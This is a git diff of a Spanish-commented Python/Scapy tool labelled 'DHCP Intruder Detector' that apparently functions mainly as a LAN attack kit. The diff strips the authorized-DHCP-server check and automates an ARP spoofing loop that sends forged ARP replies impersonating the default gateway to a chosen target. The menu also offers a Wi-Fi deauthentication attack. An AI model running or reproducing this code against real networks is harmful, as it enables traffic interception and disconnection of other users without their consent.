@@ -4,51 +4,56 @@ import paramiko
 from termcolor import colored
 import pyfiglet
 import os
-import netifaces
+
+# Configuración para deshabilitar la verificación de IP en Scapy
+conf.checkIPaddr = False
 
 # Lista de colores para darle estilo al programa
 def print_banner():
     banner = pyfiglet.figlet_format("DHCP Intruder Detector", font="slant")
     print(colored(banner, 'cyan'))
 
-# Configuración de servidores DHCP autorizados
-authorized_dhcp_servers = ["00:11:22:33:44:55"]  # Cambia con la MAC de tu router principal
-
-# Función para obtener el rango de red local
-def get_network_range():
-    iface = netifaces.gateways()['default'][netifaces.AF_INET][1]
-    ip_info = netifaces.ifaddresses(iface)[netifaces.AF_INET][0]
-    ip_address = ip_info['addr']
-    netmask = ip_info['netmask']
-    network_range = f"{ip_address}/{netmask}"
-    return network_range
+# Detectar la IP de la puerta de enlace predeterminada
+def get_default_gateway():
+    gateway = conf.route.route("0.0.0.0")[2]
+    print(colored(f"[INFO] IP de la puerta de enlace predeterminada detectada: {gateway}", "cyan"))
+    return gateway
 
 # Detectar servidores DHCP en la red
 def detect_dhcp_servers():
-    # Mostrar rango de red
-    network_range = get_network_range()
-    print(colored(f"Escaneando la red en el rango {network_range} en busca de servidores DHCP...", "yellow"))
+    print(colored("Escaneando la red en busca de servidores DHCP...", "yellow"))
+
+    # Paquete DHCP Discover
     dhcp_discover = Ether(dst="ff:ff:ff:ff:ff:ff") / IP(src="0.0.0.0", dst="255.255.255.255") / UDP(sport=68, dport=67) / BOOTP(op=1) / DHCP(options=[("message-type", "discover"), "end"])
 
     # Capturar respuestas
-    responses = srp(dhcp_discover, timeout=5, verbose=0)[0]
+    responses = srp(dhcp_discover, timeout=10, verbose=1)[0]
     detected_servers = []
 
+    # Procesar respuestas capturadas
     for idx, (_, response) in enumerate(responses):
         mac_address = response[Ether].src
         ip_address = response[IP].src
         detected_servers.append((idx + 1, ip_address, mac_address))
-        print(colored(f"{idx + 1}. Servidor DHCP detectado - IP: {ip_address}, MAC: {mac_address}", "green" if mac_address in authorized_dhcp_servers else "red"))
+        print(colored(f"{idx + 1}. Servidor DHCP detectado - IP: {ip_address}, MAC: {mac_address}", "green"))
+
+    if not detected_servers:
+        print(colored("No se han detectado servidores DHCP en la red.", "red"))
 
     return detected_servers
 
 # Ataque ARP Spoofing
-def arp_spoof(target_ip, target_mac, spoof_ip):
-    arp_response = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
+def arp_spoof(target_ip, target_mac):
+    # Detectar automáticamente la IP de la puerta de enlace predeterminada
+    gateway_ip = get_default_gateway()
+
+    # Crear paquete ARP Spoofing con MAC de destino especificada
+    arp_response = Ether(dst=target_mac) / ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip)
+    
     try:
         while True:
-            send(arp_response, verbose=0)
-            print(colored(f"[INFO] Enviando respuesta ARP falsa a {target_ip} - fingiendo ser {spoof_ip}", "cyan"))
+            sendp(arp_response, verbose=0)
+            print(colored(f"[INFO] Enviando respuesta ARP falsa a {target_ip} - fingiendo ser {gateway_ip}", "cyan"))
             time.sleep(2)
     except KeyboardInterrupt:
         print(colored("[INFO] Ataque ARP Spoofing detenido.", "yellow"))
@@ -108,9 +113,8 @@ def main():
         attack_choice = int(input(colored("\nSelecciona el tipo de ataque: ", "cyan")))
 
         if attack_choice == 1:
-            gateway_ip = input(colored("Introduce la IP del router/pasarela: ", "cyan"))
             print(colored(f"\nIniciando ARP Spoofing contra {target_ip}...", "yellow"))
-            arp_spoof(target_ip, target_mac, gateway_ip)
+            arp_spoof(target_ip, target_mac)
         elif attack_choice == 2:
             gateway_mac = input(colored("Introduce la MAC del router Wi-Fi: ", "cyan"))
             print(colored(f"\nIniciando ataque de desautenticación contra {target_ip}...", "yellow"))
